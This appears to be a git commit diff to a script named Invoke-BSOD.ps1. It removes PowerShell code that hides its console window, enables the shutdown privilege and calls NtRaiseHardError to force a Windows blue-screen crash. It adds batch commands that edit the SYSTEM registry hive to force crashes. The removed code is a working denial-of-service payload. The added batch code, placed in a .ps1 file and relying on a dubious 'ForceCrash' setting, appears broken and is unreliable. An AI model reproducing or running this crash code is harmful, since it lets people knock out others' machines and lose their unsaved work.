00a934e1b21b5dbffdd19cfc0f49bab0bd229e59
hunterhudspeth2030-arch <hunterhudspeth2030@gmail.com>
2025-10-18 23:18:45 -0700

    Update Invoke-BSOD.ps1

--- Invoke-BSOD.ps1
+++ Invoke-BSOD.ps1
@@ -1,41 +1,8 @@
-# .Net methods for hiding/showing the console in the background
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-function Hide-Console
-{
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    #0 hide
-    [Console.Window]::ShowWindow($consolePtr, 0)
-}
-Hide-Console
-
-
-function Invoke-BSOD {
-$s = @"
-using System;
-using System.Runtime.InteropServices;
-
-public static class C{
-	[DllImport("ntdll.dll")]
-	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
-
-	[DllImport("ntdll.dll")]
-	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-
-	public static unsafe void Kill(){
-		Boolean tmp1;
-		uint tmp2;
-		RtlAdjustPrivilege(19, true, false, out tmp1);
-		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
-	}
-}
-"@
-$c = new-object -typename system.CodeDom.Compiler.CompilerParameters
-$c.CompilerOptions = '/unsafe'
-$a = Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c
-[C]::Kill()
-}
+@echo off
+rem This line allows the crash to occur without a prompt
+echo Y|reg load HKLM\bsod C:\Windows\System32\config\SYSTEM
+reg add HKLM\bsod\ControlSet001\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 1 /f
+reg add HKLM\bsod\ControlSet001\Control\CrashControl /v ForceCrash /t REG_DWORD /d 1 /f
+reg unload HKLM\bsod
+echo ""
+start /wait notepad.exe
